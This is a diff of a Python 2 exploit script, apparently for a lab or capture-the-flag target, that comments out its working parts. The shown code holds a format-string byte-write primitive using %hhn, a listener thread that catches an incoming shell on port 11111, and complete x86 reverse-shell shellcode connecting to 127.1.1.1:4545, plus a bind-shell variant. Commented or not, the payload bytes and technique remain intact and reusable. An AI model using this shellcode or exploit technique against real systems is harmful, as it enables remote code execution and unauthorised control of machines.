@@ -23,39 +23,39 @@ def readLine(s):
                 break
     return receved
 
-def interact(s):
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
+#def interact(s):
+#    t = telnetlib.Telnet()
+#    t.sock = s
+#    t.interact()
 
-def writeByte(s, addr, val, idx):
-    format = "%%%dc%%%d$hhn" % (val, idx + 4)
-    format += "A"*(16 - len(format))
-    sys.stdout.write(format)
-    print "           Writing: ord(b)=%d" % val
-    s.send(format)
+#def writeByte(s, addr, val, idx):
+#    format = "%%%dc%%%d$hhn" % (val, idx + 4)
+#    format += "A"*(16 - len(format))
+#    sys.stdout.write(format)
+#    print "           Writing: ord(b)=%d" % val
+#    s.send(format)
 
-class Listener(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
+#class Listener(threading.Thread):
+#    def __init__(self):
+#        threading.Thread.__init__(self)
         
-    def run(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('', 11111))
-        s.listen(1)
-        s.settimeout(10)
-        t = telnetlib.Telnet()
-        try:
-            conn, tgt = s.accept()
-        except socket.timeout:
-            print "socket timed out. quitting..."
-            sys.exit()
-        print "incoming connection from: " + str(tgt)
-        t.sock = conn
-        t.interact()
+#    def run(self):
+#        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#        s.bind(('', 11111))
+#        s.listen(1)
+#        s.settimeout(10)
+#        t = telnetlib.Telnet()
+#        try:
+#            conn, tgt = s.accept()
+#        except socket.timeout:
+#            print "socket timed out. quitting..."
+#            sys.exit()
+#        print "incoming connection from: " + str(tgt)
+#        t.sock = conn
+#        t.interact()
 
-host = "127.0.0.1"
-lhost = host.split(".")
+#host = "127.0.0.1"
+#lhost = host.split(".")
 
 #sc ="\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93" + \
 #"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + \
@@ -66,10 +66,10 @@ lhost = host.split(".")
 #"\xb0\x0b\xcd\x80"
 # second line is IP Number "127.1.1.1"=7f... fourth is Port Number "4545"="\x2c\x49"
 # 192.168.1.132  =  "\xc0\xa8\x01\x84"
-sc="\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd"
-sc+="\x80\x49\x79\xf9\xb0\x66\x68\x01\x01\x01\x7f\x66\x68\x67\x2b\x66\x6a\x02\x89\xe1"
-sc+="\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
-sc+="\x6e\x89\xe3\x31\xc9\xcd\x80"
+#sc="\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd"
+#sc+="\x80\x49\x79\xf9\xb0\x66\x68\x01\x01\x01\x7f\x66\x68\x67\x2b\x66\x6a\x02\x89\xe1"
+#sc+="\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+#sc+="\x6e\x89\xe3\x31\xc9\xcd\x80"
 
 #bind shell
 #sc="\x31\xc0\x50\x68\x03\x01\x05\x39\x44\x44\x40\x40\x66\x50\x31\xc0"
